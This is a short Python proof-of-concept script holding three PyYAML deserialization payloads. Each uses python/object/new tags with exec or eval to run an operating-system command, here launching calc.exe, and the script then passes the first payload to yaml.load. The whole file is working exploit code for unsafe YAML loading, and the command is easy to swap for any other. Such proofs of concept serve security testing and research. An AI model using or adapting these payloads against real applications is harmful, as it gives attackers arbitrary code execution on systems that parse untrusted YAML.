#!/usr/bin/env python
# -*- coding: utf-8 -*-

import yaml

poc = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: \"__import__('os').system('calc.exe')\""""

poc2 = """!!python/object/new:tuple 
- !!python/object/new:map 
  - !!python/name:eval
  - [ "__import__('os').system('calc.exe')" ]"""

poc3 = """- !!python/object/new:str
    args: []
    state: !!python/tuple
    - "__import__('os').system('calc.exe')"
    - !!python/object/new:staticmethod
      args: [0]
      state:
        update: !!python/name:exec"""

yaml.load(poc)
